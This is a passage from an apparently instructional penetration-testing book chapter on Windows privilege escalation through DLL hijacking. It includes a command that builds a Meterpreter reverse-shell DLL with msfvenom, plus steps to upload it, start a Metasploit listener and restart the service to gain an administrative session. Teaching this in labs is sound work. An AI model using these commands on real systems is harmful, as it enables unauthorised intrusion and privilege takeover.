				<li>After adding both filters, your filter configuration should be similar to the configuration in the following screenshot:<div id="_idContainer223" class="IMG---Figure"><img src="Images/B17389_08_030.jpg" alt="Figure 8.30 – Process Monitor Filter&#13;&#10;" width="511" height="284"/></div><p class="figure-caption">Figure 8.30 – Process Monitor Filter</p><p>After you have set up the filters, you can apply them by clicking on the <strong class="bold">Apply</strong> button, as <a id="_idIndexMarker513"/>highlighted in the preceding screenshot.</p><p>These filters will only display services with missing DLLs and their respective DLL names. In this case, we are able to identify the vulnerable service and the missing DLL names with their respective paths, as highlighted in the following screenshot:</p><div id="_idContainer224" class="IMG---Figure"><img src="Images/B17389_08_031.jpg" alt="Figure 8.31 – Process Monitor missing DLLs&#13;&#10;" width="508" height="104"/></div><p class="figure-caption">Figure 8.31 – Process Monitor missing DLLs</p><p>We can now generate our custom DLL that will provide us with a Meterpreter session when executed.</p></li>
				<li>We can generate the custom DLL with <strong class="source-inline">msfvenom</strong> and use the Meterpreter payload by running the following command in Kali:<p class="source-code"><strong class="bold">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;KALI-IP&gt; LPORT=PORT -f dll &gt; hijackme.dll</strong></p><p>We will save the custom DLL file with the name of the missing DLL for the <strong class="source-inline">dllhijackservice.exe</strong> service. In our case, we will hijack the <strong class="source-inline">hijackme.dll</strong> DLL.</p></li>
				<li>After generating the custom DLL, we can transfer it to the target system under the respective service path. In our case, the path will be the following:<p class="source-code"><strong class="bold">C:\Windows\System32\wbem</strong></p><p>We can <a id="_idIndexMarker514"/>upload the custom DLL with Meterpreter by running the following command:</p><p class="source-code"><strong class="bold">upload /PATH-TO-DLL/hijackme.dll</strong></p><p>As highlighted in the following screenshot, the <strong class="source-inline">hijackme.dll</strong> file should be uploaded to the correct path:</p><div id="_idContainer225" class="IMG---Figure"><img src="Images/B17389_08_032.jpg" alt="Figure 8.32 – Uploading the custom DLL&#13;&#10;" width="1121" height="226"/></div><p class="figure-caption">Figure 8.32 – Uploading the custom DLL</p></li>
				<li>We now need to set up the Meterpreter listener with Metasploit. This can be done by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">use /exploit/multi/handler</strong></p></li>
				<li>The next step involves specifying the payload we used to create the binary with <strong class="source-inline">msfvenom</strong>. This can be done by running the following command:<p class="source-code"><strong class="bold">set payload /windows/x64/meterpreter/reverse_tcp</strong></p><p>We now need to configure the module options. In this case, we need to configure the <strong class="source-inline">LHOST</strong> and <strong class="source-inline">LPORT</strong> options as highlighted in the following screenshot:</p><div id="_idContainer226" class="IMG---Figure"><img src="Images/B17389_08_033.jpg" alt="Figure 8.33 – Meterpreter listener options&#13;&#10;" width="988" height="185"/></div><p class="figure-caption">Figure 8.33 – Meterpreter listener options</p></li>
				<li>After setting the module options, we can start the listener by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>The listener<a id="_idIndexMarker515"/> will listen for any incoming connections from the payload we generated with <strong class="source-inline">msfvenom</strong>.</p></li>
				<li>In order to execute the custom DLL, we need to restart the <strong class="source-inline">dllsvc</strong> service. This can be done by running the following commands in the Windows command shell:<p class="source-code"><strong class="bold">sc stop dllsvc</strong></p><p class="source-code"><strong class="bold">sc start dllsvc</strong></p><p>If you havefollowed the steps highlighted so far correctly, you should receive a Meterpreter session on the listener we had set up, as follows:</p><div id="_idContainer227" class="IMG---Figure"><img src="Images/B17389_08_034.jpg" alt="Figure 8.34 – DLL hijack Meterpreter&#13;&#10;" width="1008" height="161"/></div><p class="figure-caption">Figure 8.34 – DLL hijack Meterpreter</p></li>
				<li>We can verify that we have an elevated Meterpreter session by running the following command:<p class="source-code"><strong class="bold">getuid</strong></p><p>As highlighted in the following screenshot, we have successfully elevated our privileges and should have a Meterpreter session with administrative privileges:</p></li>
			</ol>
			<div>
				<div id="_idContainer228" class="IMG---Figure">
					<img src="Images/B17389_08_035.jpg" alt="Figure 8.35 – getuid Meterpreter&#13;&#10;" width="375" height="76"/>
				</div>
			</div>
			<p class="figure-caption">Figure 8.35 – getuid Meterpreter</p>
			<p>We have been<a id="_idIndexMarker516"/> able to elevate our privileges by identifying missing DLLs and generating a custom DLL that will be executed to provide us with an elevated Meterpreter session.</p>
			<h1 id="_idParaDest-120"><a id="_idTextAnchor125"/>Summary</h1>
			<p>In this chapter, we got started with understanding how to identify and exploit unquoted service paths and how they can be utilized to execute a malicious binary in order to elevate our privileges. We also explored the process of exploiting the Windows secondary logon both manually and automatically with the Metasploit framework. We then took a look at how to identify and exploit weak service permissions and ended the chapter by taking an in-depth look at how to identify missing DLLs and the process of performing DLL hijacking.</p>
			<p>In the next chapter, we will explore the process of privilege escalation through the Windows Registry.</p>
		</div>
	</div></body></html>